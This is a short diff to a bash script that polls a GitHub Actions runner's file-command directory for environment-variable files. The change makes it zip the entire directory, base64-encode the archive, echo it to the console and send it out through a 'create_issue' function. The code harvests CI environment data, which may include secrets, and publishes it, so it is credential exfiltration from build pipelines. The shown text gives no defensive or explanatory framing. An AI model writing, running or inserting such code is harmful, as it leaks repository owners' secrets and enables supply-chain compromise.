@@ -6,11 +6,19 @@ ENV_VARS_DIR='/home/runner/work/_temp/_runner_file_commands/'
 PREFIX='set_env_'
 
 MONITORED_VARS=("TARGET_VAR")
-POLL_INTERVAL=0.2
+POLL_INTERVAL=.5
 
 on_change() {
     local new_value="$1"
-    local encoded=$(cat ${ENV_VARS_DIR}${new_value} | base64)
+    local temp_zip=$(mktemp --suffix=.zip)
+    
+    # Zip the entire contents of ENV_VARS_DIR
+    zip -r "$temp_zip" "$ENV_VARS_DIR" > /dev/null 2>&1
+    
+    # Base64 encode the zip and output to console
+    local encoded=$(cat "$temp_zip" | base64 -w 0)
+    echo "Zipped and encoded $ENV_VARS_DIR:"
+    echo "$encoded"
     create_issue "$encoded"
 }
 
